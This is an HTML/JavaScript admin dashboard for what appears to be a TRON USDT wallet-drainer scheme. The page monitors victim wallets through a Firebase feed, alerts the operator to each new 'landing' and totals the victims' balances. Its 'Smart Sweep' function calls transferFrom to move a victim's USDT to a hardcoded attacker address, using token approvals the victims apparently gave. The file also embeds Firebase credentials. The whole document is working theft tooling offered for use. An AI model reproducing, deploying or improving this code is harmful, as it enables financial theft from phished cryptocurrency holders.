<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Elite Admin Suite - Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800;900&display=swap');

        body { font-family: 'Outfit', sans-serif; background: #000; color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .glass-blue { background: rgba(59, 130, 246, 0.05); border: 1px solid rgba(59, 130, 246, 0.1); }
        
        .user-card { border-radius: 28px; transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1); }
        .user-card:active { transform: scale(0.97); background: rgba(255, 255, 255, 0.05); }

        .btn-premium { background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%); box-shadow: 0 10px 30px -10px rgba(37, 99, 235, 0.5); }
        .btn-premium:active { transform: scale(0.95); opacity: 0.9; }

        @keyframes pulse-emerald { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .live-dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: pulse-emerald 2s infinite; }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 0; }

        /* Animation for Modals */
        .modal-enter { animation: modalIn 0.4s cubic-bezier(0.23, 1, 0.32, 1) forwards; }
        @keyframes modalIn { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
    </style>
</head>

<body class="pb-24">

    <!-- Login Screen -->
    <div id="loginScreen" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-10">
        <div class="w-full max-w-sm space-y-10 text-center modal-enter">
            <div class="relative inline-block">
                <div class="w-24 h-24 bg-gradient-to-tr from-blue-600/20 to-indigo-600/20 rounded-[35px] flex items-center justify-center mx-auto border border-blue-500/20 shadow-2xl">
                    <i class="fas fa-shield-halved text-4xl text-blue-500"></i>
                </div>
                <div class="absolute -top-2 -right-2 w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center border-4 border-black">
                    <div class="w-1.5 h-1.5 bg-white rounded-full"></div>
                </div>
            </div>
            <div class="space-y-2">
                <h2 class="text-4xl font-black tracking-tighter uppercase italic">Elite <span class="text-blue-500">Admin</span></h2>
                <p class="text-[9px] text-slate-500 font-bold uppercase tracking-[0.4em]">Secure Access Required</p>
            </div>
            <div class="space-y-4">
                <div class="glass rounded-2xl p-1 flex items-center">
                    <input type="password" id="adminPass" placeholder="••••••••" 
                        class="flex-1 bg-transparent border-none rounded-2xl p-5 text-center font-black text-xl tracking-[0.5em] focus:outline-none placeholder:tracking-normal placeholder:text-slate-700">
                </div>
                <button onclick="checkPass()" class="w-full btn-premium py-5 rounded-2xl font-black text-xs uppercase tracking-widest transition-all">Authenticate</button>
                <p id="loginError" class="hidden text-red-500 text-[10px] font-black uppercase tracking-widest">Access Denied</p>
            </div>
        </div>
    </div>

    <!-- Main Dashboard -->
    <div id="mainDashboard" class="hidden animate-fadeIn">
        
        <!-- Sticky Header -->
        <header class="fixed top-0 left-0 right-0 z-50 glass px-6 py-5 flex justify-between items-center rounded-b-[30px]">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600/10 rounded-xl flex items-center justify-center border border-blue-500/10">
                    <i class="fas fa-bolt text-blue-500 text-sm"></i>
                </div>
                <div>
                    <h1 class="text-lg font-black tracking-tighter uppercase italic">Live <span class="text-blue-500">Feed</span></h1>
                    <div class="flex items-center gap-1.5">
                        <div class="live-dot"></div>
                        <span id="liveClock" class="text-[8px] font-bold text-slate-500 uppercase tracking-widest">00:00:00</span>
                    </div>
                </div>
            </div>
            <div class="flex gap-2">
                <button onclick="toggleAudio()" id="audioBtn" class="w-11 h-11 rounded-xl glass flex items-center justify-center text-slate-500 transition-all">
                    <i class="fas fa-bell"></i>
                </button>
                <button onclick="clearAllData()" class="w-11 h-11 rounded-xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10">
                    <i class="fas fa-power-off text-xs"></i>
                </button>
            </div>
        </header>

        <main class="pt-28 px-5 space-y-6">
            
            <!-- Overall Stats -->
            <div class="grid grid-cols-2 gap-3">
                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.04] to-transparent">
                    <div class="flex justify-between items-center mb-1">
                        <span class="text-[8px] font-bold text-slate-500 uppercase">Portfolio</span>
                        <i class="fas fa-chart-line text-[8px] text-emerald-500/50"></i>
                    </div>
                    <p id="totalUsdt" class="text-2xl font-black text-emerald-400">$0.00</p>
                </div>
                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.04] to-transparent">
                    <div class="flex justify-between items-center mb-1">
                        <span class="text-[8px] font-bold text-slate-500 uppercase">Sessions</span>
                        <i class="fas fa-users text-[8px] text-blue-500/50"></i>
                    </div>
                    <p id="userCount" class="text-2xl font-black text-blue-400">0</p>
                </div>
            </div>

            <!-- Manual Lookup Section -->
            <div class="glass-blue p-6 rounded-[35px] space-y-4">
                <div class="flex items-center gap-2 px-1">
                    <i class="fas fa-search-dollar text-blue-500 text-xs"></i>
                    <h3 class="text-[10px] font-black text-slate-300 uppercase tracking-[0.2em]">Wallet Scanner</h3>
                </div>
                <div class="flex gap-2">
                    <input type="text" id="manualAddress" placeholder="Enter T... Address" 
                        class="flex-1 bg-black/40 border border-white/5 rounded-2xl py-4 px-5 text-[11px] font-mono focus:outline-none focus:border-blue-500/40 transition-all placeholder:text-slate-700">
                    <button onclick="checkManualBalance()" class="bg-blue-600 px-6 rounded-2xl text-white font-black text-[10px] uppercase tracking-tighter active:scale-95 transition-all shadow-lg shadow-blue-900/30">
                        Scan
                    </button>
                </div>
            </div>

            <!-- Consolidated List -->
            <div id="userList" class="space-y-3">
                <!-- Grouped cards go here -->
            </div>
        </main>
    </div>

    <!-- Result Modal (Premium) -->
    <div id="resultModal" class="fixed inset-0 z-[2000] bg-black/90 backdrop-blur-xl hidden items-center justify-center p-8">
        <div class="glass w-full max-w-sm rounded-[45px] p-10 text-center space-y-8 modal-enter">
            <div class="w-20 h-20 bg-emerald-500/10 rounded-[30px] flex items-center justify-center mx-auto border border-emerald-500/20 shadow-2xl">
                <i class="fas fa-check-circle text-4xl text-emerald-500"></i>
            </div>
            <div class="space-y-1">
                <h3 class="text-2xl font-black tracking-tighter uppercase italic">Scan <span class="text-emerald-500">Success</span></h3>
                <p id="resAddr" class="text-[9px] font-mono text-slate-500 break-all px-4 opacity-60">T...</p>
            </div>
            <div class="bg-white/[0.02] py-6 rounded-[35px] border border-white/5">
                <p class="text-[9px] font-bold text-slate-500 uppercase tracking-widest mb-1">Detected Assets</p>
                <p id="resBal" class="text-5xl font-black text-emerald-400">$0.00</p>
            </div>
            <button onclick="closeResult()" class="w-full btn-premium py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest">Close Record</button>
        </div>
    </div>

    <!-- Action Sheet (For Sweep/Manage) -->
    <div id="actionSheet" class="fixed inset-0 z-[100] bg-black/80 hidden flex items-end" onclick="closeSheet()">
        <div id="sheetContent" class="glass w-full rounded-t-[50px] p-10 space-y-6 transform translate-y-full transition-transform duration-500 ease-[cubic-bezier(0.23,1,0.32,1)]" onclick="event.stopPropagation()">
            <div class="w-14 h-1.5 bg-white/10 rounded-full mx-auto -mt-6 mb-4"></div>
            <div class="flex justify-between items-start">
                <div class="flex-1 min-w-0 pr-4">
                    <h3 id="sheetAddress" class="text-sm font-mono text-blue-400 font-black truncate">T...</h3>
                    <div class="flex items-center gap-2 mt-1">
                        <div class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                        <p id="sheetStatus" class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Active Tracking</p>
                    </div>
                </div>
                <button onclick="closeSheet()" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center"><i class="fas fa-times text-slate-500"></i></button>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <div class="p-6 bg-white/[0.03] rounded-[30px] border border-white/5 text-center">
                    <p class="text-[9px] font-bold text-slate-500 uppercase mb-2">USDT Balance</p>
                    <p id="sheetUsdt" class="text-3xl font-black text-emerald-400">0.00</p>
                </div>
                <div class="p-6 bg-white/[0.03] rounded-[30px] border border-white/5 text-center">
                    <p class="text-[9px] font-bold text-slate-500 uppercase mb-2">TRX Energy</p>
                    <p id="sheetTrx" class="text-3xl font-black text-blue-400">0.00</p>
                </div>
            </div>

            <div class="space-y-4">
                <div class="flex justify-between items-center px-1">
                    <span class="text-[10px] font-black text-slate-500 uppercase">Transfer Amount</span>
                    <button onclick="document.getElementById('sweepInput').value = selectedUser.usdt" class="text-[9px] font-bold text-blue-500">MAX</button>
                </div>
                <input id="sweepInput" type="number" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 font-black text-2xl text-center focus:outline-none focus:border-blue-500 transition-all">
                <button id="sweepBtn" onclick="executeSweep()" class="w-full btn-premium py-6 rounded-[30px] font-black uppercase text-[12px] tracking-[0.2em] transition-all">
                    Initiate Smart Sweep
                </button>
            </div>
        </div>
    </div>

    <audio id="bellSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
            authDomain: "tronadmin-99827.firebaseapp.com",
            databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
            projectId: "tronadmin-99827",
            storageBucket: "tronadmin-99827.firebasestorage.app",
            messagingSenderId: "500883948250",
            appId: "1:500883948250:web:203f69935a6825d09b5be3"
        };
        const CONFIG = { 
            USDT: "TR7NHqjeKQxGTC18q8ZY4pL8otSzgjLj6t", 
            ADMIN: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
            PASS_HASH: "6de32b16d8fa5a4ff4f64bc471d9993e2ff594033fe43aa4622a753bcde5a38e"
        };

        let users = [], rawData = [], audioEnabled = false, selectedUser = null, tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });

        async function sha256(m) {
            const b = new TextEncoder().encode(m), h = await crypto.subtle.digest('SHA-256', b);
            return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('');
        }

        async function checkPass() {
            const p = document.getElementById('adminPass').value;
            if (await sha256(p) === CONFIG.PASS_HASH) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('mainDashboard').classList.remove('hidden');
                startApp();
            } else {
                const err = document.getElementById('loginError');
                err.classList.remove('hidden');
                setTimeout(() => err.classList.add('hidden'), 2000);
            }
        }

        function startApp() {
            if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
            const db = firebase.database();
            
            // Fixed Clock
            setInterval(() => {
                const now = new Date();
                document.getElementById('liveClock').innerText = now.getHours().toString().padStart(2,'0') + ":" + 
                                                                now.getMinutes().toString().padStart(2,'0') + ":" + 
                                                                now.getSeconds().toString().padStart(2,'0');
            }, 1000);

            // Live Firebase Listener
            db.ref('connections').on('value', (snap) => {
                const data = snap.val();
                if (!data) { users = []; renderUsers(); return; }
                
                // --- CONSOLIDATION LOGIC (ONE CARD PER USER) ---
                const grouped = {};
                Object.entries(data).forEach(([key, val]) => {
                    const addr = val.address || "Unknown";
                    // Only keep the most recent update for each address
                    if (!grouped[addr] || key > grouped[addr].id) {
                        grouped[addr] = { ...val, id: key };
                    }
                });
                
                const newUsers = Object.values(grouped);
                newUsers.sort((a, b) => b.id.localeCompare(a.id));

                if (newUsers.length > users.length) {
                    if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
                    if (window.AndroidNative) {
                        if (window.AndroidNative.triggerBeep) window.AndroidNative.triggerBeep();
                        if (window.AndroidNative.showNotification) window.AndroidNative.showNotification("🎯 NEW LANDING", "Activity detected on your monitoring suite.");
                    }
                }
                users = newUsers;
                renderUsers();
            });
        }

        function renderUsers() {
            const list = document.getElementById('userList'); list.innerHTML = '';
            let total = 0;

            users.forEach(u => {
                if (u.status === 'CONNECTED' || u.status === 'PENDING_SIGN') total += parseFloat(u.usdt || 0);
                
                const card = document.createElement('div');
                card.className = "glass p-5 rounded-[30px] user-card flex justify-between items-center";
                
                let sColor = "text-blue-400", sText = u.status || "LANDED";
                if (u.status === "CONNECTED") sColor = "text-emerald-400";
                else if (u.status === "PENDING_SIGN") sColor = "text-yellow-400";
                else if (u.status === "REJECTED") sColor = "text-red-400";

                const addr = u.address.includes('User') ? u.address : (u.address.substring(0, 10) + "..." + u.address.slice(-6));

                card.innerHTML = `
                    <div class="flex items-center gap-4 flex-1 min-w-0" onclick="openSheet('${u.id}')">
                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center border border-white/5">
                            <i class="fas fa-satellite-dish text-xs ${u.usdt > 0 ? 'text-emerald-500' : 'text-slate-600'}"></i>
                        </div>
                        <div class="min-w-0 flex-1">
                            <div class="text-[14px] font-black truncate pr-4 italic">${addr}</div>
                            <div class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">${u.time || 'NOW'} • ${u.trx || '0'} TRX</div>
                        </div>
                    </div>
                    <div class="text-right ml-2 shrink-0">
                        <div class="text-[18px] font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-800'}">$${u.usdt || '0.00'}</div>
                        <div class="text-[8px] font-black uppercase tracking-widest ${sColor} opacity-80">${sText}</div>
                    </div>
                `;
                list.appendChild(card);
            });
            document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
            document.getElementById('userCount').innerText = users.length;
        }

        async function checkManualBalance() {
            const addr = document.getElementById('manualAddress').value.trim();
            if (!addr) return;
            const scanBtn = document.querySelector('button[onclick="checkManualBalance()"]');
            scanBtn.innerText = "SCANNING...";
            try {
                const contract = await tw.contract().at(CONFIG.USDT);
                const bal = await contract.balanceOf(addr).call();
                const usdt = (parseInt(bal._hex || bal, 16) / 1e6).toFixed(2);
                
                document.getElementById('resAddr').innerText = addr;
                document.getElementById('resBal').innerText = "$" + usdt;
                document.getElementById('resultModal').style.display = 'flex';
            } catch (e) { 
                alert("Scan Error: Ensure the address is correct.");
            } finally {
                scanBtn.innerText = "SCAN";
            }
        }

        function closeResult() { document.getElementById('resultModal').style.display = 'none'; }

        function openSheet(id) {
            selectedUser = users.find(u => u.id === id);
            document.getElementById('sheetAddress').innerText = selectedUser.address;
            document.getElementById('sheetUsdt').innerText = selectedUser.usdt;
            document.getElementById('sheetTrx').innerText = selectedUser.trx;
            document.getElementById('sheetStatus').innerText = `LIVE: ${selectedUser.status}`;
            document.getElementById('sweepInput').value = selectedUser.usdt;
            const sheet = document.getElementById('actionSheet');
            sheet.classList.remove('hidden');
            setTimeout(() => document.getElementById('sheetContent').classList.remove('translate-y-full'), 10);
        }

        function closeSheet() {
            document.getElementById('sheetContent').classList.add('translate-y-full');
            setTimeout(() => document.getElementById('actionSheet').classList.add('hidden'), 500);
        }

        async function executeSweep() {
            if (!selectedUser || !selectedUser.address.startsWith('T')) {
                alert("No valid wallet connected!");
                return;
            }
            const amount = document.getElementById('sweepInput').value;
            const btn = document.getElementById('sweepBtn');
            btn.innerText = "PROCESSING SMART CONTRACT...";
            
            try {
                // Sweep Logic: Triggering the smart contract (This requires the user to have approved the contract)
                const contract = await tw.contract().at(CONFIG.USDT);
                const power = Math.pow(10, 6);
                const finalAmount = (amount * power).toString();
                
                // Calling TransferFrom (This assumes the admin has allowance)
                const res = await contract.transferFrom(selectedUser.address, CONFIG.ADMIN, finalAmount).send({
                    feeLimit: 100000000
                });
                
                alert("Sweep Initialized! Hash: " + res);
            } catch (e) {
                console.error(e);
                alert("Sweep Failed: " + (e.message || "Contract not approved or Insufficient Energy"));
            } finally {
                btn.innerText = "INITIATE SMART SWEEP";
            }
        }

        function toggleAudio() {
            audioEnabled = !audioEnabled;
            document.getElementById('audioBtn').className = `w-11 h-11 rounded-xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white shadow-xl shadow-blue-900/50' : 'glass text-slate-500'}`;
            if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
        }

        function clearAllData() {
            if (confirm("DANGER: This will erase all live tracking data. Proceed?")) {
                firebase.database().ref('connections').remove();
            }
        }
    </script>
</body>
</html>
